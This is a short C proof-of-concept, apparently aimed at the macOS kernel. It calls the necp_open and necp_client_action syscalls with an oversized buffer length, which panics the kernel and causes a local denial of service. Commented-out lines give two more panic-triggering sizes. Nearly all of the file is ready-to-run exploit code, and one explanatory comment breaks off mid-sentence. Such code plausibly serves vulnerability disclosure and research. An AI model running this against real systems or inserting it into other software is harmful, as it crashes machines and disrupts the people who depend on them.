//This POC causes a kernel panic in the necp_client_add_flow function.  This
//function takes a buffer parameter with an unchecked size parameter.  If this
//size is larger than the maximum allowed size by copyin, the kernel will panic
//when it tries to copy in the user's buffer.  Alternatively, if _MALLOC fails
//to allocate a kernel buffer to copy this user's buffer to, _MALLOC will panic.
//Thus, this POC can cause a local denial of service.

#include <stdio.h>
#include <unistd.h>

//Taken from bsd/net/necp.h
#define NECP_CLIENT_ACTION_ADD_FLOW 17

int main(int argc, char ** argv)
{
	int fd;
	char client_id[16];
	char buffer[1024];

	//Use necp_open to get a necp file descriptor
	fd = syscall(501, 0); //501 = necp_open
	if(fd < 0)
	{
		printf("Couldn't get necp fd\n");
		return 1;
	}

	//Call necp_client_action with the add_flow action.  It passes our buffer_size
	//without checking to copyin, which panic's the kernel if the size is greater
	//than 64MB.  Prior to the copyin, _MALLOC will be used to create a
	//heap-allocated buffer to store the user data.  If _MALLOC fails, it will
	//502 = necp_client_action
	syscall(502, fd, NECP_CLIENT_ACTION_ADD_FLOW, client_id, 16, buffer, 64 * 1024 * 1024 + 1); // copy too large panic
//	syscall(502, fd, NECP_CLIENT_ACTION_ADD_FLOW, client_id, sizeof(client_id), buf, -1ull); // overflow detected panic
//	syscall(502, fd, NECP_CLIENT_ACTION_ADD_FLOW, client_id, sizeof(client_id), buf, 107374182400ull); // MALLOC returned NULL panic
	return 0;
}
